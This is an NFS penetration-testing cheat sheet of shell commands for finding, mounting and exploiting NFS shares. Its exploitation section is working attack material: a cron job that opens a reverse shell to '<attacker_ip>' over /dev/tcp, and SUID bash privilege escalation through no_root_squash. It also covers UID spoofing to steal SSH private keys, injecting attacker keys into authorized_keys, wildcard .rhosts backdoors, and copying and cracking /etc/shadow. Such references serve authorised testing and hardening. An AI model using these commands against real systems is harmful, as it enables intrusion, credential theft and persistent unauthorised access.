# NFS Pentesting Cheat Sheet
> Reconnaissance → Enumeration → Exploitation

---

## 🔍 RECONNAISSANCE

### Port & Service Discovery

```bash
nmap -sV -p 111,2049 <target>
```
Scans for RPC (port 111) and NFS (port 2049) services with version detection.

```bash
nmap -sU -sT -p 111,2049 <target>
```
Scans both UDP and TCP on RPC and NFS ports simultaneously.

```bash
nmap -p 111,2049,20048 --open <subnet>/24
```
Discovers all hosts in a subnet with NFS-related ports open.

```bash
nmap -sV --script=nfs-* <target>
```
Runs all Nmap NFS scripts at once for automated NFS reconnaissance.

```bash
masscan -p 111,2049 <subnet>/24 --rate=10000
```
High-speed scanner to quickly identify NFS-enabled hosts across large networks.

```bash
netstat -tulnp | grep -E "111|2049"
```
Lists locally listening RPC/NFS services on the current machine.

### RPC Service Identification

```bash
rpcinfo -p <target>
```
Lists all RPC programs registered on the target's portmapper (port 111).

```bash
rpcinfo -s <target>
```
Displays a summarized table of all RPC services available on the target.

```bash
rpcinfo -T tcp -u <target> nfs
```
Checks if NFS is accessible via TCP on the target host.

```bash
nmap -sV -p 111 --script=rpcinfo <target>
```
Uses Nmap's rpcinfo script to enumerate all registered RPC services.

```bash
showmount -e <target>
```
Displays the NFS export list — the most critical first step in NFS enumeration.

```bash
showmount -a <target>
```
Lists all clients that have mounted shares from the target NFS server.

```bash
showmount -d <target>
```
Shows only the directories that have been mounted by remote clients.

---

## 🗺️ ENUMERATION

### NFS Export Enumeration

```bash
showmount -e <target>
```
Retrieves the export list showing which directories are shared and to whom.

```bash
nmap -sV --script nfs-showmount <target>
```
Uses Nmap to enumerate NFS exports via the showmount protocol.

```bash
nmap -sV --script nfs-ls <target>
```
Lists files and directories in NFS shares along with permissions and ownership.

```bash
nmap -sV --script nfs-statfs <target>
```
Retrieves disk usage statistics (total/free space) for each NFS share.

```bash
nmap -p 111 --script nfs-showmount,nfs-ls,nfs-statfs <target>
```
Combines three NFS Nmap scripts for comprehensive share enumeration in one command.

### Mounting NFS Shares

```bash
mount -t nfs <target>:/share /mnt/nfs
```
Mounts a remote NFS share to a local directory for file system access.

```bash
mount -t nfs -o vers=3 <target>:/share /mnt/nfs
```
Mounts the NFS share forcing NFS version 3 (useful when v4 is restricted).

```bash
mount -t nfs -o vers=2 <target>:/share /mnt/nfs
```
Mounts using NFS version 2, which lacks authentication improvements of v3/v4.

```bash
mount -t nfs -o nolock,tcp <target>:/share /mnt/nfs
```
Mounts without file locking via TCP — useful when UDP is filtered or unstable.

```bash
mount -t nfs -o ro <target>:/share /mnt/nfs
```
Mounts the NFS share in read-only mode to safely browse without modification.

```bash
mount -t nfs4 <target>:/ /mnt/nfs
```
Mounts using NFSv4 which uses a single virtual filesystem namespace at root.

```bash
umount /mnt/nfs
```
Unmounts the NFS share from the local directory after enumeration is complete.

### File & Directory Enumeration

```bash
ls -la /mnt/nfs/
```
Lists all files including hidden ones with permissions, owner, and group info.

```bash
find /mnt/nfs/ -type f -name "*.conf" 2>/dev/null
```
Searches the mounted NFS share for all configuration files recursively.

```bash
find /mnt/nfs/ -type f -name "*.key" -o -name "*.pem" -o -name "*.ppk" 2>/dev/null
```
Hunts for private keys and certificate files stored in the NFS share.

```bash
find /mnt/nfs/ -perm -4000 2>/dev/null
```
Finds SUID binaries on the NFS share that could be used for privilege escalation.

```bash
find /mnt/nfs/ -perm -2000 2>/dev/null
```
Finds SGID binaries on the NFS share that run with elevated group privileges.

```bash
find /mnt/nfs/ -writable -type f 2>/dev/null
```
Identifies world-writable files on the NFS share (potential write access exploit).

```bash
find /mnt/nfs/ -writable -type d 2>/dev/null
```
Identifies world-writable directories on the mounted NFS share.

```bash
find /mnt/nfs/ -user root -type f 2>/dev/null
```
Lists all files owned by root on the NFS share.

```bash
find /mnt/nfs/ -size +10M -type f 2>/dev/null
```
Finds large files that may contain database dumps, backups, or sensitive archives.

```bash
grep -r "password\|passwd\|secret\|api_key\|token" /mnt/nfs/ 2>/dev/null
```
Recursively searches all NFS files for hardcoded credentials and secrets.

### Permission & UID/GID Analysis

```bash
ls -lan /mnt/nfs/
```
Lists files with numeric UID/GID values to identify mismatched ownership.

```bash
stat /mnt/nfs/<file>
```
Shows detailed file metadata including permissions, UID, GID, and timestamps.

```bash
cat /mnt/nfs/etc/passwd 2>/dev/null
```
Reads the passwd file from the NFS share to enumerate system users and UIDs.

```bash
cat /mnt/nfs/etc/shadow 2>/dev/null
```
Attempts to read shadow password hashes if the share exposes the system root.

```bash
cat /mnt/nfs/etc/exports 2>/dev/null
```
Reads the NFS exports configuration file to understand share permissions.

### NFS Configuration Analysis

```bash
cat /etc/exports
```
Displays the local NFS exports file revealing share paths, access rules, and options.

```bash
grep -E "no_root_squash|no_all_squash|insecure" /etc/exports
```
Searches exports config for dangerous options that enable privilege escalation.

```bash
exportfs -v
```
Lists all active NFS exports with verbose details about permissions and options.

```bash
cat /proc/fs/nfsd/exports
```
Reads the kernel's active NFS export table for real-time export information.

### Automated NFS Enumeration Tools

```bash
nmap -sV --script nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 <target>
```
Runs all critical NFS Nmap scripts in a single comprehensive scan.

```bash
msf> use auxiliary/scanner/nfs/nfsmount
```
Metasploit module that enumerates NFS shares across a range of target hosts.

```bash
python3 nfs-enum.py <target>
```
Custom NFS enumeration script that automates share discovery and file listing.

---

## 💥 EXPLOITATION

### no_root_squash Exploitation

```bash
# Check for no_root_squash in exports
cat /etc/exports | grep no_root_squash
```
Identifies shares with `no_root_squash` — allows remote root to act as local root.

```bash
# Mount the share and copy /bin/bash with SUID as root
mount -t nfs <target>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
```
Copies bash with SUID bit set onto the NFS share as root (requires no_root_squash).

```bash
# On target machine execute the SUID bash
/mnt/nfs/bash -p
```
Executes the SUID bash binary to gain a root shell on the target system.

### UID Spoofing Attack

```bash
useradd -u <target_uid> fakeuser
su fakeuser
ls -la /mnt/nfs/
```
Creates a local user matching the target UID to bypass NFS UID-based access control.

```bash
# Add user with specific UID without creating home dir
useradd -u 1001 -M -s /bin/bash attacker
su attacker
cat /mnt/nfs/home/victim/.ssh/id_rsa
```
Spoofs the victim's UID to read their SSH private key from the NFS share.

### SSH Key Injection

```bash
# Mount the target's home directory
mount -t nfs <target>:/home/user /mnt/nfs

# Inject attacker's public key into authorized_keys
mkdir -p /mnt/nfs/.ssh
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/.ssh/authorized_keys
chmod 600 /mnt/nfs/.ssh/authorized_keys
```
Adds attacker's SSH public key to the victim's authorized_keys for persistent access.

```bash
ssh -i ~/.ssh/id_rsa user@<target>
```
Connects via SSH using the injected public key for passwordless authentication.

### Writing Malicious Cron Jobs

```bash
# If /etc is exported with no_root_squash
echo "* * * * * root bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" >> /mnt/nfs/etc/cron.d/backdoor
```
Writes a reverse shell cron job to the target's crontab via writable NFS share.

### .rhosts / hosts.equiv Exploitation

```bash
echo "<attacker_ip>" > /mnt/nfs/home/user/.rhosts
chmod 644 /mnt/nfs/home/user/.rhosts
rsh -l user <target>
```
Creates a `.rhosts` file via NFS to enable passwordless rsh login as the target user.

```bash
echo "+ +" > /mnt/nfs/home/user/.rhosts
```
Writes a wildcard `.rhosts` entry allowing any host to login as the user without password.

### Sensitive File Extraction

```bash
# Copy SSH private key
cp /mnt/nfs/home/user/.ssh/id_rsa /tmp/stolen_key
chmod 600 /tmp/stolen_key
ssh -i /tmp/stolen_key user@<target>
```
Steals an SSH private key from the NFS share to authenticate directly to the target.

```bash
# Extract database credentials
find /mnt/nfs/ -name "*.env" -o -name "config.php" -o -name "database.yml" | xargs grep -l "password" 2>/dev/null
```
Finds web application config files on the NFS share containing database credentials.

```bash
# Read /etc/shadow if root squashing is disabled
cp /mnt/nfs/etc/shadow /tmp/shadow
john /tmp/shadow --wordlist=/usr/share/wordlists/rockyou.txt
```
Copies shadow file and cracks password hashes with John the Ripper.

### NFS Interception (MITM)

```bash
tcpdump -i eth0 port 2049 -w nfs_traffic.pcap
```
Captures raw NFS traffic for offline analysis (effective against NFSv2/v3 — no encryption).

```bash
wireshark nfs_traffic.pcap
```
Analyzes captured NFS traffic to extract file contents and credentials in Wireshark.

### NFSv4 Exploitation

```bash
mount -t nfs4 <target>:/ /mnt/nfs4
ls -la /mnt/nfs4/
```
Mounts NFSv4 pseudo-root filesystem to browse all exported paths from a single mount.

```bash
nmap --script nfs-ls -p 2049 <target>
```
Lists files accessible via NFSv4 to detect misconfigured access controls.

### Metasploit Modules

```bash
msf> use auxiliary/scanner/nfs/nfsmount
msf> set RHOSTS <target>
msf> run
```
Automatically enumerates NFS shares on single or multiple target hosts.

```bash
msf> use exploit/linux/nfs/no_root_squash
```
Exploits NFS shares with `no_root_squash` to gain root-level code execution.

---

## QUICK REFERENCE — ONE-LINERS

```bash
# Full NFS recon on a single target
nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs,rpcinfo <target>

# Discover all NFS hosts in subnet
nmap -p 111 --open --script nfs-showmount <subnet>/24

# Mount and immediately check for dangerous options
showmount -e <target> && mount -t nfs <target>:/share /mnt/nfs && cat /etc/exports

# Hunt for credentials in all mounted files
grep -rEi "password|passwd|secret|token|api_key" /mnt/nfs/ 2>/dev/null

# Find all SUID/SGID binaries on mounted share
find /mnt/nfs -perm /6000 -type f 2>/dev/null

# Full UID spoof and read sensitive files
useradd -u $(stat -c '%u' /mnt/nfs/home/target) spoof && su spoof -c "cat /mnt/nfs/home/target/.ssh/id_rsa"

# Check no_root_squash and auto-exploit
showmount -e <target> | grep -v "^Export" | while read share host; do echo "[*] Testing $share"; done
```
